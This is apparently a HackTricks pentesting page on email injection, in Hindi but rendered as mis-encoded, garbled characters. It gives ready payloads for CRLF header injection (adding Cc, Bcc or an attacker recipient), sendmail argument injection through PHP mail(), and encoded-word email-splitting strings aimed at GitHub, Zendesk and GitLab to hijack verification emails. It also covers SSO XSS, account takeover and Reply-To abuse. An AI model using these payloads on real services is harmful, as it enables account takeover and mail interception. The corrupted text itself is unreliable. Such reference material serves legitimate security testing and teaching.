# рдИрдореЗрд▓ рдЗрдВрдЬреЗрдХреНрд╢рди

{{#include ../banners/hacktricks-training.md}}

## рднреЗрдЬреЗ рдЧрдП рдИ-рдореЗрд▓ рдореЗрдВ рдЗрдВрдЬреЗрдХреНрдЯ рдХрд░реЗрдВ

### рдкреНрд░реЗрд╖рдХ рддрд░реНрдХ рдХреЗ рдмрд╛рдж Cc рдФрд░ Bcc рдЗрдВрдЬреЗрдХреНрдЯ рдХрд░реЗрдВ
```
From:sender@domain.com%0ACc:recipient@domain.co,%0ABcc:recipient1@domain.com
```
рд╕рдВрджреЗрд╢ рдкреНрд░рд╛рдкреНрддрдХрд░реНрддрд╛ рдФрд░ рдкреНрд░рд╛рдкреНрддрдХрд░реНрддрд╛1 рдЦрд╛рддреЛрдВ рдХреЛ рднреЗрдЬрд╛ рдЬрд╛рдПрдЧрд╛ред

### Inject argument
```
From:sender@domain.com%0ATo:attacker@domain.com
```
рд╕рдВрджреЗрд╢ рдореВрд▓ рдкреНрд░рд╛рдкреНрддрдХрд░реНрддрд╛ рдФрд░ рд╣рдорд▓рд╛рд╡рд░ рдЦрд╛рддреЗ рдХреЛ рднреЗрдЬрд╛ рдЬрд╛рдПрдЧрд╛ред

### Inject Subject argument
```
From:sender@domain.com%0ASubject:This is%20Fake%20Subject
```
рдирдХрд▓реА рд╡рд┐рд╖рдп рдХреЛ рдореВрд▓ рд╡рд┐рд╖рдп рдореЗрдВ рдЬреЛрдбрд╝рд╛ рдЬрд╛рдПрдЧрд╛ рдФрд░ рдХреБрдЫ рдорд╛рдорд▓реЛрдВ рдореЗрдВ рдЗрд╕реЗ рдмрджрд▓ рднреА рджрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ред рдпрд╣ рдореЗрд▓ рд╕реЗрд╡рд╛ рдХреЗ рд╡реНрдпрд╡рд╣рд╛рд░ рдкрд░ рдирд┐рд░реНрднрд░ рдХрд░рддрд╛ рд╣реИред

### рд╕рдВрджреЗрд╢ рдХреЗ рд╢рд░реАрд░ рдХреЛ рдмрджрд▓реЗрдВ

рдПрдХ рджреЛ-рд▓рд╛рдЗрди рдлреАрдб рдЗрдВрдЬреЗрдХреНрдЯ рдХрд░реЗрдВ, рдлрд┐рд░ рд╕рдВрджреЗрд╢ рдХреЗ рд╢рд░реАрд░ рдХреЛ рдмрджрд▓рдиреЗ рдХреЗ рд▓рд┐рдП рдЕрдкрдирд╛ рд╕рдВрджреЗрд╢ рд▓рд┐рдЦреЗрдВред
```
From:sender@domain.com%0A%0AMy%20New%20%0Fake%20Message.
```
### PHP mail() рдлрд╝рдВрдХреНрд╢рди рдХрд╛ рд╢реЛрд╖рдг
```bash
# The function has the following definition:

php --rf mail

Function [ <internal:standard> function mail ] {
- Parameters [5] {
Parameter #0 [ <required> $to ]
Parameter #1 [ <required> $subject ]
Parameter #2 [ <required> $message ]
Parameter #3 [ <optional> $additional_headers ]
Parameter #4 [ <optional> $additional_parameters ]
}
}
```
#### 5рд╡рд╛рдВ рдкреИрд░рд╛рдореАрдЯрд░ ($additional_parameters)

рдпрд╣ рдЕрдиреБрднрд╛рдЧ рдЗрд╕ рдкрд░ рдЖрдзрд╛рд░рд┐рдд рд╣реЛрдЧрд╛ рдХрд┐ **рдХреИрд╕реЗ рдЗрд╕ рдкреИрд░рд╛рдореАрдЯрд░ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рдП рдорд╛рди рд▓реЗрддреЗ рд╣реИрдВ рдХрд┐ рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдЗрд╕реЗ рдирд┐рдпрдВрддреНрд░рд┐рдд рдХрд░рддрд╛ рд╣реИ**ред

рдпрд╣ рдкреИрд░рд╛рдореАрдЯрд░ рдЙрд╕ рдХрдорд╛рдВрдб рд▓рд╛рдЗрди рдореЗрдВ рдЬреЛрдбрд╝рд╛ рдЬрд╛рдПрдЧрд╛ рдЬрд┐рд╕реЗ PHP рдмрд╛рдЗрдирд░реА sendmail рдХреЛ рдХреЙрд▓ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд░реЗрдЧрд╛ред рд╣рд╛рд▓рд╛рдБрдХрд┐, рдЗрд╕реЗ `escapeshellcmd($additional_parameters)` рдлрд╝рдВрдХреНрд╢рди рдХреЗ рд╕рд╛рде рд╕рд╛рдл рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ред

рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдЗрд╕ рдорд╛рдорд▓реЗ рдореЗрдВ **sendmail рдХреЗ рд▓рд┐рдП рдЕрддрд┐рд░рд┐рдХреНрдд рдкреИрд░рд╛рдореАрдЯрд░ рдЗрдВрдЬреЗрдХреНрдЯ рдХрд░ рд╕рдХрддрд╛ рд╣реИ**ред

#### /usr/sbin/sendmail рдХреЗ рдХрд╛рд░реНрдпрд╛рдиреНрд╡рдпрди рдореЗрдВ рдЕрдВрддрд░

**sendmail** рдЗрдВрдЯрд░рдлрд╝реЗрд╕ **MTA рдИрдореЗрд▓ рд╕реЙрдлрд╝реНрдЯрд╡реЗрдпрд░** (Sendmail, Postfix, Exim рдЖрджрд┐) рджреНрд╡рд╛рд░рд╛ рдкреНрд░рджрд╛рди рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдЬреЛ рд╕рд┐рд╕реНрдЯрдо рдкрд░ рд╕реНрдерд╛рдкрд┐рдд рд╣реИред рд╣рд╛рд▓рд╛рдБрдХрд┐ **рдмреБрдирд┐рдпрд╛рджреА рдХрд╛рд░реНрдпрдХреНрд╖рдорддрд╛** (рдЬреИрд╕реЗ -t -i -f рдкреИрд░рд╛рдореАрдЯрд░) рд╕рдВрдЧрддрддрд╛ рдХрд╛рд░рдгреЛрдВ рд╕реЗ **рдПрдХ рд╕рдорд╛рди** рд░рд╣рддреА рд╣реИ, **рдЕрдиреНрдп рдХрд╛рд░реНрдп рдФрд░ рдкреИрд░рд╛рдореАрдЯрд░** рд╕реНрдерд╛рдкрд┐рдд MTA рдХреЗ рдЖрдзрд╛рд░ рдкрд░ рдмрд╣реБрдд рднрд┐рдиреНрди рд╣реЛрддреЗ рд╣реИрдВред

рдпрд╣рд╛рдБ sendmail рдХрдорд╛рдВрдб/рдЗрдВрдЯрд░рдлрд╝реЗрд╕ рдХреЗ рд╡рд┐рднрд┐рдиреНрди рдореИрди рдкреГрд╖реНрдареЛрдВ рдХреЗ рдХреБрдЫ рдЙрджрд╛рд╣рд░рдг рджрд┐рдП рдЧрдП рд╣реИрдВ:

- Sendmail MTA: http://www.sendmail.org/\~ca/email/man/sendmail.html
- Postfix MTA: http://www.postfix.org/mailq.1.html
- Exim MTA: https://linux.die.net/man/8/eximReferences

**sendmail** рдмрд╛рдЗрдирд░реА рдХреЗ **рдЙрддреНрдкрддреНрддрд┐** рдХреЗ рдЖрдзрд╛рд░ рдкрд░ рд╡рд┐рднрд┐рдиреНрди рд╡рд┐рдХрд▓реНрдкреЛрдВ рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛рдпрд╛ рдЧрдпрд╛ рд╣реИ рддрд╛рдХрд┐ рдЙрдирдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗ рдФрд░ **рдлрд╛рдЗрд▓реЗрдВ рд▓реАрдХ рдХреА рдЬрд╛ рд╕рдХреЗрдВ рдпрд╛ рдпрд╣рд╛рдВ рддрдХ рдХрд┐ рдордирдорд╛рдиреЗ рдХрдорд╛рдВрдб рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд┐рдП рдЬрд╛ рд╕рдХреЗрдВ**ред рджреЗрдЦреЗрдВ рдХрд┐ рдХреИрд╕реЗ [**https://exploitbox.io/paper/Pwning-PHP-Mail-Function-For-Fun-And-RCE.html**](https://exploitbox.io/paper/Pwning-PHP-Mail-Function-For-Fun-And-RCE.html)

## рдИ-рдореЗрд▓ рдирд╛рдо рдореЗрдВ рдЗрдВрдЬреЗрдХреНрдЯ рдХрд░реЗрдВ

> [!CAUTION]
> рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдпрджрд┐ рдЖрдк рдХрд┐рд╕реА рд╕реЗрд╡рд╛ рдореЗрдВ рдПрдХ рдордирдорд╛рдиреЗ рдбреЛрдореЗрди рдирд╛рдо (рдЬреИрд╕реЗ Github, Gitlab, CloudFlare Zero trust...) рдХреЗ рд╕рд╛рде рдПрдХ рдЦрд╛рддрд╛ рдмрдирд╛рдиреЗ рдореЗрдВ рд╕рдлрд▓ рд╣реЛрддреЗ рд╣реИрдВ рдФрд░ рдЗрд╕реЗ рдЕрдкрдиреЗ рдореЗрд▓ рдкрддреЗ рдкрд░ рд╕рддреНрдпрд╛рдкрди рдИрдореЗрд▓ рдкреНрд░рд╛рдкреНрдд рдХрд░рдХреЗ рд╕рддреНрдпрд╛рдкрд┐рдд рдХрд░рддреЗ рд╣реИрдВ, рддреЛ рдЖрдк рдкреАрдбрд╝рд┐рдд рдХрдВрдкрдиреА рдХреЗ рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рд╕реНрдерд╛рдиреЛрдВ рддрдХ рдкрд╣реБрдБрдЪ рд╕рдХрддреЗ рд╣реИрдВред

### рдИрдореЗрд▓ рдХреЗ рдЕрдирджреЗрдЦреЗ рднрд╛рдЧ

рдЪрд┐рд╣реНрди: **+, -** рдФрд░ **{}** рджреБрд░реНрд▓рдн рдЕрд╡рд╕рд░реЛрдВ рдкрд░ рдЯреИрдЧрд┐рдВрдЧ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд┐рдП рдЬрд╛ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдЕрдзрд┐рдХрд╛рдВрд╢ рдИ-рдореЗрд▓ рд╕рд░реНрд╡рд░реЛрдВ рджреНрд╡рд╛рд░рд╛ рдЕрдирджреЗрдЦрд╛ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

- рдЙрджрд╛рд╣рд░рдг: john.doe+intigriti@example.com тЖТ john.doe@example.com

**рдХреЛрд╖реНрдардХреЛрдВ () рдХреЗ рдмреАрдЪ рдЯрд┐рдкреНрдкрдгрд┐рдпрд╛рдБ** рд╢реБрд░реБрдЖрдд рдпрд╛ рдЕрдВрдд рдореЗрдВ рднреА рдЕрдирджреЗрдЦреА рдХреА рдЬрд╛рдПрдВрдЧреАред

- рдЙрджрд╛рд╣рд░рдг: john.doe(intigriti)@example.com тЖТ john.doe@example.com

### рд╡реНрд╣itelist рдмрд╛рдпрдкрд╛рд╕

<figure><img src="../images/image (812).png" alt="https://www.youtube.com/watch?app=desktop&#x26;v=4ZsTKvfP1g0"><figcaption></figcaption></figure>

### рдЙрджреНрдзрд░рдг

<figure><img src="../images/image (626).png" alt="https://www.youtube.com/watch?app=desktop&#x26;v=4ZsTKvfP1g0"><figcaption></figcaption></figure>

### рдЖрдИрдкреА

рдЖрдк рд╡рд░реНрдЧрд╛рдХрд╛рд░ рдмреНрд░реИрдХреЗрдЯ рдХреЗ рдмреАрдЪ рдбреЛрдореЗрди рдирд╛рдо рдХреЗ рд░реВрдк рдореЗрдВ рдЖрдИрдкреА рдХрд╛ рднреА рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:

- john.doe@\[127.0.0.1]
- john.doe@\[IPv6:2001:db8::1]

### рдИрдореЗрд▓ рдПрдиреНрдХреЛрдбрд┐рдВрдЧ

рдЬреИрд╕рд╛ рдХрд┐ [**рдЗрд╕ рд╢реЛрдз**](https://portswigger.net/research/splitting-the-email-atom) рдореЗрдВ рд╕рдордЭрд╛рдпрд╛ рдЧрдпрд╛ рд╣реИ, рдИрдореЗрд▓ рдирд╛рдореЛрдВ рдореЗрдВ рдПрдиреНрдХреЛрдбреЗрдб рд╡рд░реНрдг рднреА рд╣реЛ рд╕рдХрддреЗ рд╣реИрдВ:

- **PHP 256 рдУрд╡рд░рдлреНрд▓реЛ**: PHP `chr` рдлрд╝рдВрдХреНрд╢рди рдПрдХ рд╡рд░реНрдг рдореЗрдВ 256 рдЬреЛрдбрд╝рддрд╛ рд░рд╣реЗрдЧрд╛ рдЬрдм рддрдХ рдХрд┐ рдпрд╣ рд╕рдХрд╛рд░рд╛рддреНрдордХ рдирд╣реАрдВ рд╣реЛ рдЬрд╛рддрд╛ рдФрд░ рдлрд┐рд░ рдСрдкрд░реЗрд╢рди `%256` рдХрд░рддрд╛ рд╣реИред
- `String.fromCodePoint(0x10000 + 0x40) // ЁРБА тЖТ @`

> [!TIP]
> рдЗрд╕ рдЯреНрд░рд┐рдХ рдХрд╛ рд▓рдХреНрд╖реНрдп рдПрдХ рдЗрдВрдЬреЗрдХреНрд╢рди рдХреЗ рд╕рд╛рде рд╕рдорд╛рдкреНрдд рд╣реЛрдирд╛ рд╣реИ рдЬреИрд╕реЗ `RCPT TO:<"collab@psres.net>collab"@example.com>`\
> рдЬреЛ рд╕рддреНрдпрд╛рдкрди рдИрдореЗрд▓ рдХреЛ рдЕрдкреЗрдХреНрд╖рд┐рдд рдИрдореЗрд▓ рдкрддреЗ рд╕реЗ рдЕрд▓рдЧ рдПрдХ рдЕрд▓рдЧ рдИрдореЗрд▓ рдкрддреЗ рдкрд░ рднреЗрдЬреЗрдЧрд╛ (рдЗрд╕рд▓рд┐рдП рдИрдореЗрд▓ рдирд╛рдо рдХреЗ рдЕрдВрджрд░ рдПрдХ рдФрд░ рдИрдореЗрд▓ рдкрддреЗ рдХреЛ рдкреЗрд╢ рдХрд░рдирд╛ рдФрд░ рдИрдореЗрд▓ рднреЗрдЬрддреЗ рд╕рдордп рд╡рд╛рдХреНрдпрд╡рд┐рдиреНрдпрд╛рд╕ рдХреЛ рддреЛрдбрд╝рдирд╛)ред

рд╡рд┐рднрд┐рдиреНрди рдПрдиреНрдХреЛрдбрд┐рдВрдЧ:
```bash
# Format
=? utf-8 ? q ? =41=42=43 ?= hi@example.com --> ABChi@example.com

# =? -> Start of encode
# utf-8 -> encoding used
# ? -> separator
# q -> type of encoding
# ? -> separator
# =41=42=43 -> Hex encoded data
# ?= end of encoding

# Other encodings, same example:
#┬аiso-8859-1
=?iso-8859-1?q?=61=62=63?=hi@example.com
# utf-8
=?utf-8?q?=61=62=63?=hi@example.com
# utf-7
=?utf-7?q?<utf-7 encoded string>?=hi@example.com
# q encoding + utf-7
=?utf-7?q?&=41<utf-7 encoded string without initial A>?=hi@example.com
# base64
=?utf-8?b?QUJD?=hi@example.com
# bas64 + utf-7
=?utf-7?q?<utf-7 encoded string in base64>?=hi@example.com
#punycode
x@xn--svg/-9x6 тЖТ x@<svg/
```
Payloads:

- Github: `=?x?q?collab=40psres.net=3e=00?=foo@example.com`
- рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдПрдиреНрдХреЛрдбреЗрдб `@` =40 рдХреЗ рд░реВрдк рдореЗрдВ, рдПрдиреНрдХреЛрдбреЗрдб `>` рдХреЗ рд░реВрдк рдореЗрдВ `=3e` рдФрд░ `null` рдХреЗ рд░реВрдк рдореЗрдВ `=00`&#x20;
- рдпрд╣ рд╕рддреНрдпрд╛рдкрди рдИрдореЗрд▓ `collab@psres.net` рдкрд░ рднреЗрдЬреЗрдЧрд╛
- Zendesk: `"=?x?q?collab=22=40psres.net=3e=00==3c22x?="@example.com`
- рдкрд╣рд▓реЗ рдХреА рддрд░рд╣ рд╣реА рдЯреНрд░рд┐рдХ рд▓реЗрдХрд┐рди рд╢реБрд░реБрдЖрдд рдореЗрдВ рдХреБрдЫ рд╕рд╛рдорд╛рдиреНрдп рдЙрджреНрдзрд░рдг рдЬреЛрдбрд╝рддреЗ рд╣реБрдП рдФрд░ рдПрдиреНрдХреЛрдбреЗрдб рдЙрджреНрдзрд░рдг `=22` рдХреЛ рдПрдиреНрдХреЛрдбреЗрдб `@` рд╕реЗ рдкрд╣рд▓реЗ рдФрд░ рдлрд┐рд░ рдЕрдЧрд▓реЗ рдИрдореЗрд▓ рд╕реЗ рдкрд╣рд▓реЗ рдХреБрдЫ рдЙрджреНрдзрд░рдг рд╢реБрд░реВ рдФрд░ рдмрдВрдж рдХрд░рддреЗ рд╣реБрдП Zendesk рджреНрд╡рд╛рд░рд╛ рдЖрдВрддрд░рд┐рдХ рд░реВрдк рд╕реЗ рдЙрдкрдпреЛрдЧ рдХреА рдЧрдИ рд╕рд┐рдВрдЯреИрдХреНрд╕ рдХреЛ рдареАрдХ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП
- рдпрд╣ рд╕рддреНрдпрд╛рдкрди рдИрдореЗрд▓ `collab@psres.net` рдкрд░ рднреЗрдЬреЗрдЧрд╛
- Gitlab: `=?x?q?collab=40psres.net_?=foo@example.com`
- рдкрддрд╛ рдЕрд▓рдЧ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЕрдВрдбрд░рд╕реНрдХреЛрд░ рдХреЗ рдЙрдкрдпреЛрдЧ рдкрд░ рдзреНрдпрд╛рди рджреЗрдВ
- рдпрд╣ рд╕рддреНрдпрд╛рдкрди рдИрдореЗрд▓ `collab@psres.net` рдкрд░ рднреЗрдЬреЗрдЧрд╛
- Punycode: Punycode рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ Joomla рдореЗрдВ `<style` рдЯреИрдЧ рдХреЛ рдЗрдВрдЬреЗрдХреНрдЯ рдХрд░рдирд╛ рд╕рдВрднрд╡ рдерд╛ рдФрд░ рдЗрд╕реЗ CSS рдПрдХреНрд╕рдлрд┐рд▓реНрдЯреНрд░реЗрд╢рди рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ CSRF рдЯреЛрдХрди рдЪреБрд░рд╛рдиреЗ рдХреЗ рд▓рд┐рдП рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдирд╛ред

#### Tooling

- рдЗрди рдкреНрд░рдХрд╛рд░ рдХреЗ рд╕рдВрдпреЛрдЬрдиреЛрдВ рдХреЛ рдлрдЬрд╝ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ **Burp Suite Turbo Intruder рд╕реНрдХреНрд░рд┐рдкреНрдЯ** рд╣реИ рддрд╛рдХрд┐ рдИрдореЗрд▓ рдкреНрд░рд╛рд░реВрдкреЛрдВ рдкрд░ рд╣рдорд▓рд╛ рдХрд░рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХреА рдЬрд╛ рд╕рдХреЗред рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдореЗрдВ рдкрд╣рд▓реЗ рд╕реЗ рд╣реА рд╕рдВрднрд╛рд╡рд┐рдд рд░реВрдк рд╕реЗ рдХрд╛рд░реНрдпрд╢реАрд▓ рд╕рдВрдпреЛрдЬрди рд╣реИрдВред
- [Hackvertor](https://portswigger.net/bappstore/65033cbd2c344fbabe57ac060b5dd100) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдПрдХ рдИрдореЗрд▓ рд╕реНрдкреНрд▓рд┐рдЯрд┐рдВрдЧ рд╣рдорд▓реЗ рдХрд╛ рдирд┐рд░реНрдорд╛рдг рдХрд░рдирд╛ рднреА рд╕рдВрднрд╡ рд╣реИ

### Other vulns

![https://www.youtube.com/watch?app=desktop&v=4ZsTKvfP1g0](<../images/image (1131).png>)

## Third party SSO

### XSS

рдХреБрдЫ рд╕реЗрд╡рд╛рдПрдБ рдЬреИрд╕реЗ **github** рдпрд╛ **salesforce рдЖрдкрдХреЛ** **XSS рдкреЗрд▓реЛрдбреНрд╕ рдХреЗ рд╕рд╛рде рдПрдХ рдИрдореЗрд▓ рдкрддрд╛ рдмрдирд╛рдиреЗ** рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддреА рд╣реИрдВред рдпрджрд┐ рдЖрдк **рдЗрди рдкреНрд░рджрд╛рддрд╛рдУрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЕрдиреНрдп рд╕реЗрд╡рд╛рдУрдВ рдореЗрдВ рд▓реЙрдЧрд┐рди рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ** рдФрд░ рдпреЗ рд╕реЗрд╡рд╛рдПрдБ **рдИрдореЗрд▓ рдХреЛ рд╕рд╣реА рдврдВрдЧ рд╕реЗ рд╕рд╛рдлрд╝ рдирд╣реАрдВ рдХрд░ рд░рд╣реА рд╣реИрдВ**, рддреЛ рдЖрдк **XSS** рдХрд╛ рдХрд╛рд░рдг рдмрди рд╕рдХрддреЗ рд╣реИрдВред

### Account-Takeover

рдпрджрд┐ рдПрдХ **SSO рд╕реЗрд╡рд╛** рдЖрдкрдХреЛ **рджрд┐рдП рдЧрдП рдИрдореЗрд▓ рдкрддреЗ рдХреЛ рд╕рддреНрдпрд╛рдкрд┐рдд рдХрд┐рдП рдмрд┐рдирд╛ рдПрдХ рдЦрд╛рддрд╛ рдмрдирд╛рдиреЗ** рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддреА рд╣реИ (рдЬреИрд╕реЗ **salesforce**) рдФрд░ рдлрд┐рд░ рдЖрдк рдЙрд╕ рдЦрд╛рддреЗ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ **рдПрдХ рдЕрд▓рдЧ рд╕реЗрд╡рд╛ рдореЗрдВ рд▓реЙрдЧрд┐рди рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ** рдЬреЛ **salesforce рдкрд░ рднрд░реЛрд╕рд╛ рдХрд░рддреА рд╣реИ**, рддреЛ рдЖрдк рдХрд┐рд╕реА рднреА рдЦрд╛рддреЗ рддрдХ рдкрд╣реБрдБрдЪ рд╕рдХрддреЗ рд╣реИрдВред\
&#xNAN;_&#x4E;ote рдХрд┐ salesforce рдпрд╣ рд╕рдВрдХреЗрдд рдХрд░рддрд╛ рд╣реИ рдХрд┐ рджрд┐рдпрд╛ рдЧрдпрд╛ рдИрдореЗрд▓ рд╕рддреНрдпрд╛рдкрд┐рдд рдерд╛ рдпрд╛ рдирд╣реАрдВ рд▓реЗрдХрд┐рди рдЗрд╕рд▓рд┐рдП рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЛ рдЗрд╕ рдЬрд╛рдирдХрд╛рд░реА рдХреЛ рдзреНрдпрд╛рди рдореЗрдВ рд░рдЦрдирд╛ рдЪрд╛рд╣рд┐рдПред_

## Reply-To

рдЖрдк _**From: company.com**_ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдПрдХ рдИрдореЗрд▓ рднреЗрдЬ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ _**Replay-To: attacker.com**_ рдФрд░ рдпрджрд┐ рдХреЛрдИ **рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рдЙрддреНрддрд░** рднреЗрдЬрд╛ рдЬрд╛рддрд╛ рд╣реИ рдХреНрдпреЛрдВрдХрд┐ рдИрдореЗрд▓ **рдПрдХ рдЖрдВрддрд░рд┐рдХ рдкрддреЗ** рд╕реЗ **рднреЗрдЬрд╛ рдЧрдпрд╛** рдерд╛ рддреЛ **рд╣рдорд▓рд╛рд╡рд░** рдЙрд╕ **рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛** рдХреЛ **рдкреНрд░рд╛рдкреНрдд** рдХрд░рдиреЗ рдореЗрдВ рд╕рдХреНрд╖рдо рд╣реЛ рд╕рдХрддрд╛ рд╣реИред

## Hard Bounce Rate

рдХреБрдЫ рд╕реЗрд╡рд╛рдПрдБ, рдЬреИрд╕реЗ AWS, рдПрдХ рдереНрд░реЗрд╢реЛрд▓реНрдб рд▓рд╛рдЧреВ рдХрд░рддреА рд╣реИрдВ рдЬрд┐рд╕реЗ **Hard Bounce Rate** рдХреЗ рд░реВрдк рдореЗрдВ рдЬрд╛рдирд╛ рдЬрд╛рддрд╛ рд╣реИ, рдЬреЛ рдЖрдорддреМрд░ рдкрд░ 10% рдкрд░ рд╕реЗрдЯ рд╣реЛрддрд╛ рд╣реИред рдпрд╣ рдПрдХ рдорд╣рддреНрд╡рдкреВрд░реНрдг рдореИрдЯреНрд░рд┐рдХ рд╣реИ, рд╡рд┐рд╢реЗрд╖ рд░реВрдк рд╕реЗ рдИрдореЗрд▓ рд╡рд┐рддрд░рдг рд╕реЗрд╡рд╛рдУрдВ рдХреЗ рд▓рд┐рдПред рдЬрдм рдпрд╣ рджрд░ рдкрд╛рд░ рд╣реЛ рдЬрд╛рддреА рд╣реИ, рддреЛ рд╕реЗрд╡рд╛, рдЬреИрд╕реЗ AWS рдХреА рдИрдореЗрд▓ рд╕реЗрд╡рд╛, рдирд┐рд▓рдВрдмрд┐рдд рдпрд╛ рдЕрд╡рд░реБрджреНрдз рд╣реЛ рд╕рдХрддреА рд╣реИред

рдПрдХ **hard bounce** рдЙрд╕ **рдИрдореЗрд▓** рдХреЛ рд╕рдВрджрд░реНрднрд┐рдд рдХрд░рддрд╛ рд╣реИ рдЬреЛ рдкреНрд░реЗрд╖рдХ рдХреЛ рд╡рд╛рдкрд╕ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ рдХреНрдпреЛрдВрдХрд┐ рдкреНрд░рд╛рдкреНрддрдХрд░реНрддрд╛ рдХрд╛ рдкрддрд╛ рдЕрдорд╛рдиреНрдп рдпрд╛ рдЕрд╕реНрддрд┐рддреНрд╡рд╣реАрди рд╣реИред рдпрд╣ рд╡рд┐рднрд┐рдиреНрди рдХрд╛рд░рдгреЛрдВ рд╕реЗ рд╣реЛ рд╕рдХрддрд╛ рд╣реИ, рдЬреИрд╕реЗ рдХрд┐ **рдИрдореЗрд▓** рдХреЛ рдПрдХ рдЧреИрд░-рдореМрдЬреВрдж рдкрддреЗ рдкрд░ рднреЗрдЬрд╛ рдЧрдпрд╛, рдПрдХ рдРрд╕рд╛ рдбреЛрдореЗрди рдЬреЛ рд╡рд╛рд╕реНрддрд╡рд┐рдХ рдирд╣реАрдВ рд╣реИ, рдпрд╛ рдкреНрд░рд╛рдкреНрддрдХрд░реНрддрд╛ рд╕рд░реНрд╡рд░ рдХрд╛ **рдИрдореЗрд▓** рд╕реНрд╡реАрдХрд╛рд░ рдХрд░рдиреЗ рд╕реЗ рдЗрдирдХрд╛рд░ред

AWS рдХреЗ рд╕рдВрджрд░реНрдн рдореЗрдВ, рдпрджрд┐ рдЖрдк 1000 рдИрдореЗрд▓ рднреЗрдЬрддреЗ рд╣реИрдВ рдФрд░ рдЙрдирдореЗрдВ рд╕реЗ 100 рд╣рд╛рд░реНрдб рдмрд╛рдЙрдВрд╕ рдореЗрдВ рдкрд░рд┐рдгрдд рд╣реЛрддреЗ рд╣реИрдВ (рдЬреИрд╕реЗ рдЕрдорд╛рдиреНрдп рдкрддреЗ рдпрд╛ рдбреЛрдореЗрди рдХреЗ рдХрд╛рд░рдг), рддреЛ рдЗрд╕рдХрд╛ рдЕрд░реНрде рд╣реЛрдЧрд╛ 10% рд╣рд╛рд░реНрдб рдмрд╛рдЙрдВрд╕ рджрд░ред рдЗрд╕ рджрд░ рддрдХ рдкрд╣реБрдБрдЪрдиреЗ рдпрд╛ рдЗрд╕реЗ рдкрд╛рд░ рдХрд░рдиреЗ рд╕реЗ AWS SES (Simple Email Service) рдЖрдкрдХреЗ рдИрдореЗрд▓ рднреЗрдЬрдиреЗ рдХреА рдХреНрд╖рдорддрд╛рдУрдВ рдХреЛ рдЕрд╡рд░реБрджреНрдз рдпрд╛ рдирд┐рд▓рдВрдмрд┐рдд рдХрд░ рд╕рдХрддрд╛ рд╣реИред

рдмрд┐рдирд╛ рд░реБрдХрд╛рд╡рдЯ рдИрдореЗрд▓ рд╕реЗрд╡рд╛ рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд░рдиреЗ рдФрд░ рдкреНрд░реЗрд╖рдХ рдХреА рдкреНрд░рддрд┐рд╖реНрдард╛ рдмрдирд╛рдП рд░рдЦрдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рдХрдо рд╣рд╛рд░реНрдб рдмрд╛рдЙрдВрд╕ рджрд░ рдмрдирд╛рдП рд░рдЦрдирд╛ рдорд╣рддреНрд╡рдкреВрд░реНрдг рд╣реИред рдЖрдкрдХреЗ рдореЗрд▓рд┐рдВрдЧ рд╕реВрдЪрд┐рдпреЛрдВ рдореЗрдВ рдИрдореЗрд▓ рдкрддреЗ рдХреА рдЧреБрдгрд╡рддреНрддрд╛ рдХреА рдирд┐рдЧрд░рд╛рдиреА рдФрд░ рдкреНрд░рдмрдВрдзрди рдХрд░рдирд╛ рдЗрд╕ рд▓рдХреНрд╖реНрдп рдХреЛ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдореЗрдВ рдорд╣рддреНрд╡рдкреВрд░реНрдг рд░реВрдк рд╕реЗ рдорджрдж рдХрд░ рд╕рдХрддрд╛ рд╣реИред

рдЕрдзрд┐рдХ рд╡рд┐рд╕реНрддреГрдд рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП, AWS рдХреЗ рдЖрдзрд┐рдХрд╛рд░рд┐рдХ рджрд╕реНрддрд╛рд╡реЗрдЬрд╝ рдореЗрдВ рдмрд╛рдЙрдВрд╕ рдФрд░ рд╢рд┐рдХрд╛рдпрддреЛрдВ рдХреЛ рд╕рдВрднрд╛рд▓рдиреЗ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рджреЗрдЦрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ [AWS SES Bounce Handling](https://docs.aws.amazon.com/ses/latest/DeveloperGuide/notification-contents.html#bounce-types).

